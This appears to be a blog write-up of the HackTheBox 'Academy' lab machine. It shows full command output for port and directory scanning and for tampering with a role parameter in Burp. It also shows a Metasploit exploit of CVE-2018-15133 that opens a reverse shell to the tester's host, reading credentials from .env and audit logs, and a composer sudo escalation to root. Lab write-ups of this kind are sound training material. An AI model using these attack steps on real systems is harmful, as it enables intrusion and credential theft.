---
layout: post
title:  "HackTheBox Academy Writeup" 
tags: hackthebox burp-proxy CVE-2018-15133 composer-sudo-priv-esc
categories: hackthebox active-machine 
rel-img: /assets/img/htb/academy/academy.png
description: Exploiting CVE-2018-15133 to gain first access, make some basic linux enumeration to escalating priviledge and go to root!!
---

### Hackthebox Academy  Writeup
![Academy](/assets/img/htb/academy/academy.png)

## Abstract

Exploiting CVE-2018-15133 to gain first access, make some basic linux enumeration to escalating priviledge and go to root!!

## Summary
1. Initial foothold
  - Nmap recon
  - Gobuster enum
  - Burp request manipulation
2. CVE-2018-15133
3. User Flag
4. Priviledge Escalation
5. Root Flag

## Initial foothold

### Nmap recon

```
sh4ck@kali:~$ sudo nmap -sS -p- 10.10.10.215 -vv
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 10:36 CET
Initiating Ping Scan at 10:36
Scanning 10.10.10.215 [4 ports]
Completed Ping Scan at 10:36, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:36
Completed Parallel DNS resolution of 1 host. at 10:36, 0.04s elapsed
Initiating SYN Stealth Scan at 10:36
Scanning 10.10.10.215 [65535 ports]
Discovered open port 80/tcp on 10.10.10.215
Discovered open port 22/tcp on 10.10.10.215
Discovered open port 33060/tcp on 10.10.10.215
SYN Stealth Scan Timing: About 27.50% done; ETC: 10:38 (0:01:22 remaining)
SYN Stealth Scan Timing: About 56.04% done; ETC: 10:38 (0:00:48 remaining)
Completed SYN Stealth Scan at 10:38, 101.01s elapsed (65535 total ports)
Nmap scan report for 10.10.10.215
Host is up, received reset ttl 63 (0.055s latency).
Scanned at 2020-11-09 10:36:21 CET for 101s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
33060/tcp open  mysqlx  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 101.17 seconds
           Raw packets sent: 65669 (2.889MB) | Rcvd: 65541 (2.622MB)
```

Nmap revealed that port 22,80 and 33060 was opened. I started to browse web application, and found two link,login and register, at the home page. 

I moved forward and used gobuster for some interesting file or folder:

### Gobuster enum

```
sh4ck@kali:~$ gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirb/common.txt -t 40 -x .txt,.php,.html,.zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html,zip
[+] Timeout:        10s
===============================================================
2020/11/09 10:39:54 Starting gobuster
===============================================================
/admin.php (Status: 200)
/admin.php (Status: 200)
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.hta.zip (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.zip (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.txt (Status: 403)
/config.php (Status: 200)
/home.php (Status: 302)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/11/09 10:40:29 Finished                                                                                                                                                                                                               
===============================================================
```
So in addition to above link, i discovered an interesting admin.php page.

I registered new user, and than i logged in, but found nothing useful. 

![webapp register page](/assets/img/htb/academy/register-page.png)

I tried to register some user, and for all of these i had alway same backend page:

![webapp backend page](/assets/img/htb/academy/backend-page.png)

And none of these users was able to logging in to admin.php page.

### Burp request manipulation

So i decided to intercept the register post request with burp proxy, and i discovered hidden parameter in post request `roleid=0`

![burp interception](/assets/img/htb/academy/change-role.png)

I modified the `roleid` form `0` to `1`, after forwarding account creation.

Finally i logged in to admin.php page:

![admin page](/assets/img/htb/academy/academy_admin.png)

Based on this notes I added the domain dev-staging-01.academy.htb to my hosts file.

And visiting the new domain i got some info about laravel app 

![laravel app](/assets/img/htb/academy/dev-staging.png)

### CVE-2018-15133

From HTB official forum and because i had a laravel APP KEY, i tryed to expoit laravel token unserialize as per CVE-2018-15133. i ran metasploit with required options and got www-data reverse shell:

```
msf5 exploit(unix/http/laravel_token_unserialize_exec) > show options 

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                             yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.219     yes       The listen address (an interface may be specified)
   LPORT  4545             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic





www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

## User Flag

After some basic enumeration i found credentials under `.env` file:

```
www-data@academy:/var/www/html/academy$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```
With above password i tried to escalate a user, and i succesfully switched to cry0l1t3 and got user.txt

```
www-data@academy:/var/www/html/academy$ ls -la /home/cry0l1t3
ls -la /home/cry0l1t3
total 44
drwxr-xr-x 6 cry0l1t3 cry0l1t3 4096 Nov  9 11:58 .
drwxr-xr-x 8 root     root     4096 Aug 10 00:34 ..
lrwxrwxrwx 1 root     root        9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25  2020 .bashrc
drwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 .cache
drwx------ 4 cry0l1t3 cry0l1t3 4096 Nov  9 11:53 .gnupg
-rw------- 1 cry0l1t3 cry0l1t3   45 Nov  9 11:58 .lesshst
drwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12 02:30 .local
-rw-r--r-- 1 cry0l1t3 cry0l1t3  807 Feb 25  2020 .profile
drwxr-xr-x 3 cry0l1t3 cry0l1t3 4096 Nov  9 11:52 snap
-r--r----- 1 cry0l1t3 cry0l1t3   33 Nov  9 11:18 user.txt
www-data@academy:/var/www/html/academy$ su cry0l1t3
su cry0l1t3
Password: mySup3rP4s5w0rd!!

$ id
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
cry0l1t3@academy:/var/www/html/academy$
```
## Priviledge Escalation

I continued to enumerate and with linpeas i found interesting audit log that i could read:

```
cry0l1t3@academy:/var/www/html/htb-academy-dev-01/public$ cat /var/log/audit/audit.log.3 | grep 1002
</public$ cat /var/log/audit/audit.log.3 | grep 1002      
type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
type=USER_AUTH msg=audit(1597199304.778:85): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:authentication grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=USER_ACCT msg=audit(1597199304.778:86): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:accounting grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=CRED_ACQ msg=audit(1597199304.778:87): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:setcred grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=USER_START msg=audit(1597199304.778:88): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_tty_audit,pam_permit,pam_umask,pam_unix,pam_systemd acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=USER_END msg=audit(1597199317.622:91): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_tty_audit,pam_permit,pam_umask,pam_unix,pam_systemd acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=CRED_DISP msg=audit(1597199317.622:92): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:setcred grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
```
I noticed "su" command (ran by mrb3n) followed by data="some hex string". This is because audit stored command parameters in hex format into audit.log file.
I decode the string from hex to ascii and found password mrb3n_Ac@d3my!

```
So i switched to user mrb3n and found something useful to sudo file:
 
cry0l1t3@academy:/var/www/html/htb-academy-dev-01/public$ su mrb3n
su mrb3n
Password: mrb3n_Ac@d3my!

$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
mrb3n@academy:/var/www/html/htb-academy-dev-01/public$ sudo -l
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
mrb3n@academy:/var/www/html/htb-academy-dev-01/public$
```
## Root Flag

I browsed to GTFOBins and found composer sudo priviledge escalation. I followed the schema and got root:

```
mrb3n@academy:~$ TF=$(mktemp -d)
TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
<":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo /usr/bin/composer --working-dir=$TF run-script x
sudo /usr/bin/composer --working-dir=$TF run-script x
[sudo] password for mrb3n: mrb3n_Ac@d3my!

PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 
```
and than caught root.txt.
